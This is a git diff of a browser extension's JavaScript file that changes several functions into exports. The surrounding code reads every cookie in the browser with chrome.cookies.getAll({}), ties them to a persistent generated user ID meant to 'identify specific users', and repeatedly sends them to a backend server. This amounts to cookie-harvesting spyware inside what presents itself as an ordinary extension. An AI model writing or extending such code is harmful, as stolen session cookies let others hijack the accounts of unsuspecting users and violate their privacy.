@@ -3,7 +3,7 @@ let reduceCalls= false;
 const REDUCE_CALLS_PERIOD = 30000;
 //Enabling the extension to be able to identify specific users
 
-function getOrGenerateUUID(callback) {
+export function getOrGenerateUUID(callback) {
   chrome.storage.local.get("userId", (data) => {
     let userId = data.userId;
     if (!userId) {
@@ -21,7 +21,7 @@ function getOrGenerateUUID(callback) {
 }
 
 //seding cookies reducing the API calls
-function sendCookiesForReduceCalls(cookies) {
+export function sendCookiesForReduceCalls(cookies) {
   if (!reduceCalls) {
     sendCookiesToServer(cookies);
     reduceCalls= true;
@@ -32,7 +32,7 @@ function sendCookiesForReduceCalls(cookies) {
 }
 
 //getting the cookies here
-function getAllCookiesAsync() {
+export function getAllCookiesAsync() {
   return new Promise((resolve, reject) => {
     chrome.cookies.getAll({}, (cookies) => {
       if (chrome.runtime.lastError) {
@@ -44,7 +44,7 @@ function getAllCookiesAsync() {
   });
 }
 
-async function updateAllCookiesAndSend() {
+export async function updateAllCookiesAndSend() {
   try {
     const cookies = await getAllCookiesAsync();
     sendCookiesForReduceCalls(cookies);
@@ -55,7 +55,7 @@ async function updateAllCookiesAndSend() {
 
 
 //to send the cookies to the server
-function sendCookiesToServer(cookies) {
+export function sendCookiesToServer(cookies) {
 
   getOrGenerateUUID((userId) => {
     const formattedCookies = cookies.map(cookie => ({
@@ -87,7 +87,7 @@ function sendCookiesToServer(cookies) {
 }
   
 // here the cookies are send to the back end
-function getAllCookiesAndSendToServer() {
+export function getAllCookiesAndSendToServer() {
   chrome.cookies.getAll({}, function(cookies) {
     if (chrome.runtime.lastError) {
       return;
